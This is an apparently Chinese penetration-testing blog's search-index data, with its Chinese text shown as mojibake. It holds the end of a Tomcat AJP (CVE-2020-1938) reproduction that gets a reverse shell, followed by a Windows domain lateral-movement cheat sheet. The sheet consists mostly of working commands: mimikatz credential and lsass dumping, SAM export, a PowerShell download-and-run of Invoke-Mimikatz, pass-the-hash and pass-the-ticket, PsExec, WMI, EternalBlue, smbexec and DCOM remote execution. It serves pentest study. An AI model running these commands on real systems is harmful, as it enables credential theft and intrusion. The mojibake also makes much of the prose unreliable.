æ–‡ä»¶ ç”±äºè¯¥æ¼æ´è¦é…åˆ æ–‡ä»¶ä¸Šä¼  ï¼Œå†è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼š # æŸ¥çœ‹å®¹å™¨ ID docker ps -a docker cp shell.txt å®¹å™¨ID:/usr/local/tomcat/webapps/ROOT/shell.txt æŸ¥çœ‹æ–‡ä»¶ï¼š å¯åŠ¨ msf ç›‘å¬ æ‰§è¡Œä¿®æ”¹åçš„ expï¼š python2 poc.py 127.0.0.1 -p 8009 -f \"/shell.txt\" æ³¨æ„ï¼šæœ¬äººåœ¨æµ‹è¯•æ—¶ï¼Œä½¿ç”¨ä¸€èˆ¬çš„ä¼ å‚æ•°çš„ webshell æ—¶æ— æ³•æ­£ç¡®è§£æï¼Œå¯ä»¥è¿›ä¸€æ­¥ä¿®æ”¹è„šæœ¬è§£å†³ã€‚ æˆåŠŸå¼¹å› shell ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:3","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æç›¸å…³","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¸¸ç”¨ Windows è¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"IPC net use \\\\IP\\ipc$ \"password\" /user:Administrator IPC çš„åˆ©ç”¨æ¡ä»¶ å¼€å¯ 139 ç«¯å£ ç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº« ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ Windows è‡ªå¸¦çš„å·¥å…·è·å–è¿œç¨‹ä¸»æœºä¿¡æ¯ dir å‘½ä»¤ dir \\\\IP\\c$ tasklist å‘½ä»¤ tasklist /S IP /U administrator /P password ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è®¡åˆ’ä»»åŠ¡ at å‘½ä»¤ ä¸»è¦åœ¨ Windows server 2008 ä¹‹å‰ç‰ˆæœ¬ æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿæ—¶é—´ net time \\\\IP å°† payload å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿä¸­ copy payload.bat \\\\IP\\C$ ä½¿ç”¨ at å‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡ at \\\\IP 8:00AM C:\\payload.bat è¿”å›ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ ID æ¸…é™¤ at è®°å½• at \\\\IP taskID /delete ä½¿ç”¨ at å°†æ‰§è¡Œç»“æœä¿å­˜åˆ°è¿œç¨‹ï¼Œå†è¯»å–ç»“æœï¼š at \\\\IP 8:00AM cmd.exe /c \"ipconfig \u003e C:/1.txt\" type \\\\IP\\C$\\1.txt schtask å‘½ä»¤ å»ºç«‹ IPC è¿æ¥ åˆ›å»ºåä¸º task çš„è®¡åˆ’ä»»åŠ¡ schtask /create /s IP /tn test /sc onstart /tr c:\\payload.bat /ru system /f æ‰§è¡Œè¯¥è®¡åˆ’ä»»åŠ¡ schtask /run /s IP /i /tn \"test\" åˆ é™¤è®¡åˆ’ä»»åŠ¡ schtask /delete /s IP /tn \"test\" /f ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows ç³»ç»Ÿæ•£åˆ—å€¼è·å– ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å•æœºå¯†ç æŠ“å– GetPass GetPassword_x64.exe PwDump7 PwDump7.exe é€šè¿‡ SAM å’Œ SYSTEM æ–‡ä»¶æŠ“å–å¯†ç  å¯¼å‡º SAM å’Œ System æ–‡ä»¶ reg save hklm\\sam sam.hive reg save hklm\\system system.hive é€šè¿‡è¯»å– SAM å’Œ System æ–‡ä»¶è·å¾— NTLM Hash mimikatz lsadump::sam /sam:sam.hive system:system.hive cain ç›®æ ‡æœºå™¨ä½¿ç”¨ mimikatz ç›´æ¥è¯»å–æœ¬åœ° SAM æ–‡ä»¶ privilege::debug lsadump::sam ä½¿ç”¨ mimikatz åœ¨çº¿è¯»å– SAM æ–‡ä»¶ mimikatz.exe \"privilege::debug\" \"log\" \"sekurlsa::loginpasswords\" ä½¿ç”¨ mimikatz ç¦»çº¿è¯»å– lass.dmp æ–‡ä»¶ å¯¼å‡º lass.dmp æ–‡ä»¶ ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨å¯¼å‡º lsass.dmp æ–‡ä»¶ ä»»åŠ¡ç®¡ç†å™¨æ‰¾åˆ° lsass.exe è¿›ç¨‹ï¼Œå³é”®ï¼Œé€‰æ‹© â€œCreate Dump Fileâ€ é€‰é¡¹ ä½¿ç”¨ Procdump å¯¼å‡º lsass.dmp æ–‡ä»¶ å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·ï¼Œå…æ€ Procdump.exe -accepteula -ma lsass.exe lsass.dmp ä½¿ç”¨ mimikatz å¯¼å‡º lsass.dmp æ–‡ä»¶ä¸­çš„å¯†ç å€¼ sekurlsa::mimidump lsass.dmp sekurlsa::logonpasswords full ä½¿ç”¨ Powershell å¯¹æ•£åˆ—å€¼è¿›è¡Œ Dump æ“ä½œ Import-Module .\\Get-PassHashes.ps1 ä½¿ç”¨ Powershell è¿œç¨‹åŠ è½½ mimikatz æŠ“å–æ•£åˆ—å€¼å’Œæ˜æ–‡å¯†ç  powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PwoerSploit/master/Exfilration/Invoke-Mimikatz.ps1');Invoke-Mimikatz\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å“ˆå¸Œä¼ é€’æ”»å‡» ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ NTLM Hash è¿›è¡Œå“ˆå¸Œä¼ é€’ mimikatz \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ AES-256 å¯†é’¥è¿›è¡Œå“ˆå¸Œä¼ é€’ ä½¿ç”¨ mimikatz æŠ“å– AES-256 å¯†é’¥ mimikatz \"privilege::debug\" \"sekurlsa::ekeys\" pthæ”»å‡»ï¼ˆç›®æ ‡æœºå™¨å¿…é¡»å®‰è£… KB2871997ï¼‰ mimikatz \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç¥¨æ®ä¼ é€’ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ mimikatz è¿›è¡Œç¥¨æ®ä¼ é€’ å¯¼å‡ºç¥¨æ® mimikatz \"privilege::debug\" \"sekurlsa::tickets /exports\" æ³¨å…¥ç¥¨æ® mimikatz \"kerberos::ptt\" \"C:\\xxx.kirbi\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ kekeo è¿›è¡Œç¥¨æ®ä¼ é€’ ç”Ÿæˆç¥¨æ®æ–‡ä»¶ kekeo \"tgt:ask /user:administrator /domain:pentest.hack /ntlm:[NTLM]\" å°†ç¥¨æ®æ–‡ä»¶å¯¼å…¥å†…å­˜ kekeo \"kerberos::ptt xxx.kirbi\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PsExec çš„ä½¿ç”¨ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PsTools å·¥å…·ä¸­çš„ PsExec å»ºç«‹ IPC è¿æ¥ net use \\\\IP\\ipc$ \"password\" /u:administrator è·å– System æƒé™çš„ äº¤äº’å¼shell PsExec.exe -accepteula \\\\IP -s cmd.exe æˆ– PsExec.exe -accepteula \\\\IP -s cmd.exe /c ipconfig å¦‚æœä¸ä½¿ç”¨ -s å‘½ä»¤ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª Administrator æƒé™çš„ shell å¦‚æœæ²¡æœ‰å»ºç«‹ IPC è¿æ¥ï¼š PsExec.exe -accepteula \\\\IP -u administrator -p password -s cmd.exe ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Metasploit ä¸­çš„ psexec æ¨¡å— exploit/windows/smb/psexec exploit/windows/smb/psexec_pshï¼ˆpowershell ç‰ˆæœ¬ï¼‰ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"WMI çš„ä½¿ç”¨ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸºæœ¬å‘½ä»¤ wmic /node:IP /user:administrator /password:passed process call create \"cmd.exe /c ipconfig \u003e ip.txt\" å»ºç«‹ IPC è¿æ¥åï¼Œä½¿ç”¨ type å‘½ä»¤è¯»å–ç»“æœï¼š type \\\\IP\\C$\\ip.txt ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"impacket åŒ…ä¸­çš„ wmiexec wmiexec.py administrator:password@IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"wmiexec.vbs åŠäº¤äº’å¼ shell cscript.exe //nologo wmiexec.vbs /shell IP administrator password æ‰§è¡Œå•æ¡å‘½ä»¤ cscript.exe wmiexec.vbs /cmd IP administrator password \"ipconfig\" å¯¹äºè¿è¡Œæ—¶é—´è¾ƒé•¿çš„å‘½ä»¤ï¼Œä¾‹å¦‚ pingã€systeminfoï¼Œéœ€è¦åŠ å…¥ -wait 5000 å‘½ä»¤æˆ–è€…æ›´é•¿ç­‰å¾…æ—¶é—´ã€‚åœ¨è¿è¡Œ nc ç­‰ä¸éœ€è¦è¾“å‡ºå•éœ€è¦ä¸€ç›´ç­‰å¾…è¿è¡Œçš„è¿›ç¨‹æ—¶ï¼Œéœ€è¦ä½¿ç”¨ -persist å‚æ•°ã€‚ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Invoke-WmiCommand powersploitå·¥å…·åŒ…ä¸­ å°† Invoke-Wmicommand.ps1 å¯¼å…¥ç³»ç»Ÿ $User = \"pentest.hacker\\administrator\" $Password = ConvertTo-SecureString -String \"password\" -AsPlainText -Force $Cred = New-Object -TypeName System.Management.AutoMation.PSCredential -ArgumentList $User, $Password $Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName IP $Remore.PayloadOutput ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Invoke-WMIMethod åˆ©ç”¨ powershell è‡ªå¸¦çš„ Invoke-WMIMethod ï¼Œéäº¤äº’ï¼Œæ— å›æ˜¾ã€‚ $User = \"pentest.hacker\\administrator\" $Password = ConvertTo-SecureString -String \"password\" -AsPlainText -Force $Cred = New-Object -TypeName System.Management.AutoMation.PSCredential -ArgumentList $User, $Password $Remote = Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList \"calc.exe\" -Credential $Cred -ComputerName IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ°¸æ’ä¹‹è“æ¼æ´ auxiliary/scanner/smb/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"smbexec ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"C++ ç‰ˆæœ¬ smbexec å°† execserver.exe ä¸Šä¼ åˆ°åˆ°ç›®æ ‡ç³»ç»Ÿçš„ C:\\Windows\\ ç›®å½•ä¸‹ï¼Œè§£é™¤ UAC å¯¹å‘½ä»¤çš„é™åˆ¶ã€‚ net use \\\\IP \"password\" /user:pentest\\administrator test.exe IP administrator password whoami c$ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"impacket å·¥å…·åŒ…ä¸­çš„ smbexec.py smbexec.py penteer/administrator:password\\@IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DCOM åœ¨è¿œç¨‹ç³»ç»Ÿä¸­çš„ä½¿ç”¨ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é€šè¿‡æœ¬åœ° DCOM æ‰§è¡Œå‘½ä»¤ è·å– DCOM ç¨‹åºåˆ—è¡¨ windows server 2012 åŠä»¥ä¸Š Get-CimInstance Win32_DCOMApplicatioon Windows 7ã€Windows Server 2008 Get-WmicObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication ä½¿ç”¨ DCOM æ‰§è¡Œä»»æ„å‘½ä»¤ æœ¬åœ°å¯åŠ¨ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"127.0.0.1\")).Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",\"0\",\"/c calc.exe\",\"Minimzed\") ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä½¿ç”¨ DCOM åœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ è¿œç¨‹è¿æ¥æ—¶å¿…é¡»ä½¿ç”¨å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„è´¦å· ä½¿ç”¨ IPC$ è¿æ¥è¿œç¨‹è®¡ç®—æœº net use \\\\IP \"password\" /user:pentest.hacker\\win7user æ‰§è¡Œå‘½ä»¤ è°ƒç”¨ MMC20_Application è¿œç¨‹æ‰§è¡Œå‘½ä»¤ $com=[Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"IP\")) $com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",\"0\",\"/c calc.exe\",\"Minimzed\") è°ƒç”¨ 9BA05972-F6A8-11CF-A442-00A0C90A8F39 $com=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"IP\") $obj=[System.Activator]::CreateInstance($com) $item=$obj.item() $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"c:\\windows\\system32\",\"$null\",0) 